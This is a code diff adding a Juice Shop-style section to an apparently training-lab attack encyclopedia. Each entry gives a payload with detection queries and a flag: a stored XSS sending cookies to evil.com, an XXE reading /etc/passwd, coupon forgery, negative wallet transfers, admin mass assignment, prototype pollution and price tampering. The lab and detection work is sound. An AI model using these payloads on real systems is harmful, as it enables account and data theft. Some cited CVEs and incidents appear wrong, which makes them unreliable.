@@ -744,6 +744,328 @@ const ATTACK_ENCYCLOPEDIA = {
     ]
   },
 
+  // ── Enhanced Marketplace (Juice Shop-Inspired) ───────
+  "MARKETPLACE": {
+    title: "Enhanced Marketplace — Juice Shop-Style Attacks",
+    icon: "&#128722;",
+    summary: "Business logic vulnerabilities inspired by OWASP Juice Shop, themed to the GOAD marketplace. Covers coupon forgery, wallet manipulation, XXE, CSRF, OSINT-based password resets, privilege escalation, and anti-automation bypass.",
+    attacks: [
+      {
+        id: "stored-xss-review",
+        name: "Stored XSS — Product Review Injection",
+        severity: "high",
+        endpoint: "/portal/api/shop/reviews/{item_id}",
+        mitre: { id: "T1059.007", tactic: "Execution", technique: "JavaScript Execution" },
+        description: "Product reviews accept arbitrary HTML/JS content without sanitization. XSS payloads are stored and rendered to all users viewing the product.",
+        howItWorks: [
+          "Attacker submits a review containing <script> or event handler payloads",
+          "Server stores the review without sanitization (no HTMLEncode)",
+          "When other users view the product reviews, the XSS payload executes in their browser",
+          "Attacker can steal session cookies, redirect to phishing pages, or deface the UI"
+        ],
+        examplePayload: 'POST /portal/api/shop/reviews/1\n{"author":"cersei.lannister","rating":1,"comment":"<script>document.location=\\"http://evil.com/?c=\\"+document.cookie</script>"}',
+        realWorldImpact: "Stored XSS in e-commerce reviews is one of the most common web vulnerabilities. CVE-2023-24488 (Citrix) and CVE-2022-29455 (WordPress Elementor) are high-profile examples of stored XSS enabling session hijacking.",
+        otelAttributes: {
+          "security.attack.detected": "true",
+          "security.attack.type": "stored_xss",
+          "security.attack.severity": "high",
+          "security.xss.context": "product_review"
+        },
+        apmDetection: {
+          query: "show (spans) SpanAttribute['security.attack.payload'] as XSSPayload where SpanAttribute['security.attack.type'] = 'stored_xss'",
+          explanation: "Filter for stored_xss attack type. The payload attribute reveals the injected script content."
+        },
+        laDetection: {
+          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'stored_xss' | stats count by security_source_ip",
+          explanation: "Hunt for stored XSS patterns in product review submissions."
+        },
+        flag: "FLAG{570R3D_X55_R3V13W}"
+      },
+      {
+        id: "coupon-forgery",
+        name: "Coupon Forgery — Weak Base64 Encoding",
+        severity: "high",
+        endpoint: "/portal/api/shop/coupon/apply",
+        mitre: { id: "T1565", tactic: "Impact", technique: "Data Manipulation" },
+        description: "Coupons use weak base64 encoding with a predictable format. Attackers can decode an existing coupon, modify the discount percentage, and re-encode it for unlimited discounts.",
+        howItWorks: [
+          "Attacker calls /portal/api/shop/coupons/encode-sample to get an encoded coupon",
+          "Base64 decoding reveals: SKPCOUPON|DRAGON10|10|2026-12-31",
+          "Attacker crafts a new coupon: SKPCOUPON|FORGED100|100|2099-12-31",
+          "Base64 encodes and submits via the 'encoded' parameter",
+          "Server accepts any well-formed base64 coupon without server-side validation"
+        ],
+        examplePayload: 'POST /portal/api/shop/coupon/apply\n{"encoded":"U0tQQ09VUE9OfEZPUkdFRDEwMHwxMDB8MjA5OS0xMi0zMQ=="}',
+        realWorldImpact: "Predictable coupon codes and weak encoding cost retailers millions annually. In 2020, a major fast-food chain lost $5M+ from forged promotional codes using simple base64 manipulation.",
+        otelAttributes: {
+          "security.attack.detected": "true",
+          "security.attack.type": "coupon_forge",
+          "coupon.forged_code": "FORGED100",
+          "coupon.forged_discount": "100"
+        },
+        apmDetection: {
+          query: "show (spans) SpanAttribute['coupon.forged_code'] as Code, SpanAttribute['coupon.forged_discount'] as Discount where SpanAttribute['security.attack.type'] = 'coupon_forge'",
+          explanation: "Detect forged coupons by filtering for coupon_forge attack type with high discount values."
+        },
+        laDetection: {
+          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'coupon_forge' | stats count as forge_count by security_source_ip",
+          explanation: "Count forged coupon attempts per source IP."
+        },
+        flag: "FLAG{F0RG3D_C0UP0N_DR4G0N}"
+      },
+      {
+        id: "negative-gold-transfer",
+        name: "Negative Gold Transfer — Wallet Drain",
+        severity: "high",
+        endpoint: "/portal/api/wallet/transfer",
+        mitre: { id: "T1565.002", tactic: "Impact", technique: "Transmitted Data Manipulation" },
+        description: "The wallet transfer endpoint accepts negative amounts, effectively reversing the transfer direction and stealing gold from other users.",
+        howItWorks: [
+          "Attacker initiates a transfer with a negative amount: {from:'cersei', to:'hacker', amount:-50000}",
+          "Server subtracts -50000 from cersei (adding 50000) and adds -50000 to hacker (subtracting)",
+          "Wait — the math reverses: cersei LOSES 50000, hacker GAINS 50000",
+          "No balance check or atomic operation — race conditions allow overdrawing"
+        ],
+        examplePayload: 'POST /portal/api/wallet/transfer\n{"from":"cersei.lannister","to":"hacker","amount":-50000}',
+        realWorldImpact: "Negative amount manipulation is a classic fintech vulnerability. In 2019, a major cryptocurrency exchange lost $150K when users exploited negative withdrawal amounts to inflate balances.",
+        otelAttributes: {
+          "security.attack.detected": "true",
+          "security.attack.type": "negative_transfer",
+          "wallet.negative_amount": "-50000",
+          "security.attack.subtype": "negative_quantity"
+        },
+        apmDetection: {
+          query: "show (spans) SpanAttribute['wallet.negative_amount'] as Amount where SpanAttribute['security.attack.type'] = 'negative_transfer'",
+          explanation: "Filter for negative wallet transfers indicating financial manipulation."
+        },
+        laDetection: {
+          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'negative_transfer' | stats count by security_source_ip",
+          explanation: "Track negative transfer attempts per source."
+        },
+        flag: "FLAG{N3G4T1V3_G0LD_P4YB4CK}"
+      },
+      {
+        id: "xxe-trade-import",
+        name: "XXE — XML External Entity in Trade Import",
+        severity: "critical",
+        endpoint: "/portal/api/trade/import",
+        mitre: { id: "T1190", tactic: "Initial Access", technique: "Exploit Public-Facing Application" },
+        description: "The trade import endpoint parses XML with external entity resolution enabled, allowing local file reads, SSRF, and denial of service via Billion Laughs.",
+        howItWorks: [
+          "Attacker crafts XML with an external entity: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
+          "Server's lxml parser resolves the entity with resolve_entities=True, no_network=False",
+          "The contents of /etc/passwd (or any readable file) are included in the parsed output",
+          "Attacker can also use SYSTEM 'http://internal-server/' for SSRF",
+          "Billion Laughs (<!ENTITY lol SYSTEM ...> nested) causes memory exhaustion DoS"
+        ],
+        examplePayload: 'POST /portal/api/trade/import\nContent-Type: application/xml\n\n<?xml version="1.0"?>\n<!DOCTYPE trade [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<trade><from>Stark</from><to>Lannister</to><notes>&xxe;</notes></trade>',
+        realWorldImpact: "XXE was ranked OWASP Top 10 #4 in 2017 and remains in A05:2021. CVE-2014-3529 (Apache POI) and CVE-2018-15473 (Oracle WebLogic) are notable XXE vulnerabilities in enterprise software.",
+        otelAttributes: {
+          "security.attack.detected": "true",
+          "security.attack.type": "xxe",
+          "security.attack.severity": "critical",
+          "security.xxe.body_snippet": "<!DOCTYPE trade [<!ENTITY xxe..."
+        },
+        apmDetection: {
+          query: "show (spans) SpanAttribute['security.xxe.body_snippet'] as XMLSnippet where SpanAttribute['security.attack.type'] = 'xxe'",
+          explanation: "Filter for XXE attacks. The body snippet reveals the external entity definition."
+        },
+        laDetection: {
+          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'xxe' | stats count by security_source_ip",
+          explanation: "Track XXE attempts per source IP."
+        },
+        flag: "FLAG{XX3_TR4D3_4GR33M3NT}"
+      },
+      {
+        id: "csrf-allegiance",
+        name: "CSRF — Allegiance Change Without Token",
+        severity: "high",
+        endpoint: "/portal/api/users/change-allegiance",
+        mitre: { id: "T1185", tactic: "Collection", technique: "Browser Session Hijacking" },
+        description: "The allegiance change endpoint validates no CSRF token and requires no authentication — a malicious webpage can silently change any user's house allegiance.",
+        howItWorks: [
+          "Attacker creates a malicious page: <form action='/portal/api/users/change-allegiance' method='POST'>",
+          "The form auto-submits via JavaScript when visited by an authenticated user",
+          "No CSRF token checked — the server accepts any origin",
+          "Jon Snow's allegiance is changed from House Stark to House Lannister"
+        ],
+        examplePayload: 'POST /portal/api/users/change-allegiance\n{"username":"jon.snow","house":"House Lannister"}',
+        realWorldImpact: "CSRF remains a common vulnerability. GitHub had a CSRF issue in 2012 allowing repository settings modification. Many state-changing endpoints forget CSRF protection.",
+        otelAttributes: {
+          "security.attack.detected": "true",
+          "security.attack.type": "csrf",
+          "security.csrf.referer": "",
+          "security.csrf.origin": ""
+        },
+        apmDetection: {
+          query: "show (spans) SpanAttribute['security.csrf.referer'] as Referer where SpanAttribute['security.attack.type'] = 'csrf'",
+          explanation: "Detect CSRF by checking for missing or mismatched referer headers."
+        },
+        laDetection: {
+          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'csrf' | stats count by security_source_ip, security_csrf_referer",
+          explanation: "Correlate CSRF attempts with referer analysis."
+        },
+        flag: "FLAG{C5RF_4LL3G14NC3_CH4NG3}"
+      },
+      {
+        id: "osint-password-reset",
+        name: "OSINT Password Reset — GoT Trivia Questions",
+        severity: "high",
+        endpoint: "/portal/api/auth/reset-password-security",
+        mitre: { id: "T1110.001", tactic: "Credential Access", technique: "Password Guessing" },
+        description: "Security questions use Game of Thrones trivia whose answers are publicly available. Jon Snow's direwolf is Ghost — every fan knows this.",
+        howItWorks: [
+          "Attacker calls /portal/api/auth/security-question?username=jon.snow",
+          "Server reveals: 'What is the name of your direwolf?'",
+          "Answer 'ghost' is publicly known GoT trivia (OSINT)",
+          "Attacker resets password: {username:'jon.snow', answer:'ghost', new_password:'hacked123'}",
+          "Case-insensitive comparison and no rate limiting make brute force trivial"
+        ],
+        examplePayload: 'POST /portal/api/auth/reset-password-security\n{"username":"jon.snow","answer":"ghost","new_password":"hacked123"}',
+        realWorldImpact: "Sarah Palin's Yahoo email was famously hacked in 2008 by guessing security questions (favorite school, birthdate). Security questions remain the weakest link in account recovery.",
+        otelAttributes: {
+          "security.attack.detected": "true",
+          "security.attack.type": "security_question_bypass",
+          "security.reset.username": "jon.snow",
+          "security.reset.method": "security_question"
+        },
+        apmDetection: {
+          query: "show (spans) SpanAttribute['security.reset.username'] as User where SpanAttribute['security.attack.type'] = 'security_question_bypass'",
+          explanation: "Filter for successful security question resets — each represents an OSINT exploit."
+        },
+        laDetection: {
+          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'security_question_bypass' | stats count by security_source_ip, security_username",
+          explanation: "Track OSINT-based password resets per user and source IP."
+        },
+        flag: "FLAG{05INT_S3CUR1TY_QU3ST10N}"
+      },
+      {
+        id: "hidden-admin-role",
+        name: "Privilege Escalation — Hidden Role Parameter",
+        severity: "critical",
+        endpoint: "/portal/api/auth/register-enhanced",
+        mitre: { id: "T1068", tactic: "Privilege Escalation", technique: "Exploitation for Privilege Escalation" },
+        description: "The registration endpoint accepts a hidden 'role' parameter. By default it's 'user', but setting role='admin' grants immediate admin access — classic mass assignment.",
+        howItWorks: [
+          "Attacker inspects the registration form and discovers no 'role' field in the UI",
+          "Attacker adds 'role': 'admin' to the POST body (visible in API docs or network inspection)",
+          "Server trusts the client-supplied role without validation: new_user['role'] = role",
+          "User is created with admin privileges — full access to the admin panel"
+        ],
+        examplePayload: 'POST /portal/api/auth/register-enhanced\n{"username":"hacker","password":"test","role":"admin"}',
+        realWorldImpact: "Mass assignment was the root cause of the 2012 GitHub breach where a user made themselves admin of any repository. Rails, Django, and Express frameworks have all had mass assignment issues.",
+        otelAttributes: {
+          "security.attack.detected": "true",
+          "security.attack.type": "privilege_escalation",
+          "security.escalation.role": "admin",
+          "security.escalation.username": "hacker"
+        },
+        apmDetection: {
+          query: "show (spans) SpanAttribute['security.escalation.role'] as Role, SpanAttribute['security.escalation.username'] as User where SpanAttribute['security.attack.type'] = 'privilege_escalation'",
+          explanation: "Detect admin registration by filtering for privilege_escalation with role attributes."
+        },
+        laDetection: {
+          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'privilege_escalation' | stats count by security_source_ip, security_escalation_role",
+          explanation: "Track privilege escalation attempts per role type."
+        },
+        flag: "FLAG{H1DD3N_R0L3_H4ND_0F_K1NG}"
+      },
+      {
+        id: "prototype-pollution-config",
+        name: "Prototype Pollution — Deep Merge Config",
+        severity: "critical",
+        endpoint: "/portal/api/config/update",
+        mitre: { id: "T1059", tactic: "Execution", technique: "Command and Scripting Interpreter" },
+        description: "The config update endpoint uses a deep merge function that doesn't filter dangerous keys like __proto__, constructor, or __class__. This allows prototype pollution to modify application behavior.",
+        howItWorks: [
+          "Attacker sends: {__proto__: {isAdmin: true}} to /portal/api/config/update",
+          "The _deep_merge() function recursively merges all keys without filtering",
+          "In JavaScript: Object.prototype.isAdmin is now true (all objects inherit it)",
+          "In Python: the APP_CONFIG dict gets arbitrary keys injected",
+          "Can be escalated to RCE via __class__.__globals__.__builtins__ chains"
+        ],
+        examplePayload: 'POST /portal/api/config/update\n{"__proto__":{"isAdmin":true},"constructor":{"prototype":{"polluted":true}}}',
+        realWorldImpact: "Prototype pollution affects npm packages with millions of downloads: lodash (CVE-2019-10744), jQuery (CVE-2019-11358), and Ajv (CVE-2020-15366). It can lead to RCE, denial of service, or authentication bypass.",
+        otelAttributes: {
+          "security.attack.detected": "true",
+          "security.attack.type": "prototype_pollution",
+          "security.attack.severity": "critical",
+          "security.pollution.keys": "__proto__, constructor"
+        },
+        apmDetection: {
+          query: "show (spans) SpanAttribute['security.pollution.keys'] as PollutionKeys where SpanAttribute['security.attack.type'] = 'prototype_pollution'",
+          explanation: "Detect prototype pollution by filtering for the pollution keys attribute."
+        },
+        laDetection: {
+          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'prototype_pollution' | stats count by security_source_ip",
+          explanation: "Track prototype pollution attempts. Any occurrence is critical."
+        },
+        flag: "FLAG{PR0T0_P0LLUT10N_W1NT3RF3LL}"
+      },
+      {
+        id: "price-tampering",
+        name: "Price Tampering — Client-Side Price Override",
+        severity: "high",
+        endpoint: "/portal/api/shop/purchase-enhanced",
+        mitre: { id: "T1565.002", tactic: "Impact", technique: "Transmitted Data Manipulation" },
+        description: "The enhanced purchase endpoint trusts a client-supplied 'price' parameter, allowing attackers to buy items at any price they choose.",
+        howItWorks: [
+          "Attacker intercepts the purchase request using browser DevTools or a proxy (Burp Suite)",
+          "Attacker adds 'price: 1' to the request body for an item costing 15,000 gold",
+          "Server uses client-supplied price: unit_price = client_price if client_price is not None else item['price']",
+          "Transaction completes at the attacker's price — a 15,000g sword for 1 gold"
+        ],
+        examplePayload: 'POST /portal/api/shop/purchase-enhanced\n{"item_id":1,"quantity":1,"price":1,"username":"hacker"}',
+        realWorldImpact: "Price tampering in e-commerce is a multi-billion dollar problem. In 2019, researchers demonstrated buying airline tickets for $0 by manipulating fare calculation parameters.",
+        otelAttributes: {
+          "security.attack.detected": "true",
+          "security.attack.type": "price_tampering",
+          "shop.original_price": "15000",
+          "shop.tampered_price": "1"
+        },
+        apmDetection: {
+          query: "show (spans) SpanAttribute['shop.original_price'] as Original, SpanAttribute['shop.tampered_price'] as Tampered where SpanAttribute['security.attack.type'] = 'price_tampering'",
+          explanation: "Detect price tampering by comparing original and tampered price attributes."
+        },
+        laDetection: {
+          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'price_tampering' | stats count by security_source_ip, shop_original_price, shop_tampered_price",
+          explanation: "Correlate price tampering events with source IPs and the price differential."
+        },
+        flag: "FLAG{PR1C3_T4MP3R_1R0N_B4NK}"
+      },
+      {
+        id: "captcha-bypass",
+        name: "CAPTCHA Bypass — Answer Leaked in Response",
+        severity: "medium",
+        endpoint: "/portal/api/feedback",
+        mitre: { id: "T1185", tactic: "Collection", technique: "Browser Session Hijacking" },
+        description: "The CAPTCHA endpoint includes the answer in its JSON response, making it trivially bypassable. Feedback can also be submitted without any CAPTCHA at all.",
+        howItWorks: [
+          "Attacker calls GET /portal/api/feedback/captcha",
+          "Response includes: {captcha_id: '...', challenge: 'What is 12 + 7?', answer: '19'}",
+          "The answer field is right there — no need to solve it!",
+          "Alternatively, submit feedback without captcha_id at all — server accepts it"
+        ],
+        examplePayload: 'POST /portal/api/feedback\n{"comment":"Automated spam","rating":1,"author":"bot"}',
+        realWorldImpact: "Weak CAPTCHAs enable automated spam, credential stuffing, and bot attacks. Ticketmaster, concert venues, and e-commerce sites all suffer from CAPTCHA bypass at scale.",
+        otelAttributes: {
+          "security.attack.detected": "true",
+          "security.attack.type": "captcha_bypass",
+          "security.captcha.skipped": "true"
+        },
+        apmDetection: {
+          query: "show (spans) SpanAttribute['security.captcha.skipped'] as Skipped where SpanAttribute['security.attack.type'] = 'captcha_bypass'",
+          explanation: "Detect CAPTCHA bypass via the skipped attribute."
+        },
+        laDetection: {
+          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'captcha_bypass' | stats count by security_source_ip",
+          explanation: "High volumes from a single IP indicate automated abuse."
+        },
+        flag: "FLAG{C4PTCH4_BYP455_R4V3N}"
+      }
+    ]
+  },
+
   // ── GOAD Active Directory Attacks ─────────────────────
   "GOAD": {
     title: "GOAD — Active Directory Attacks",
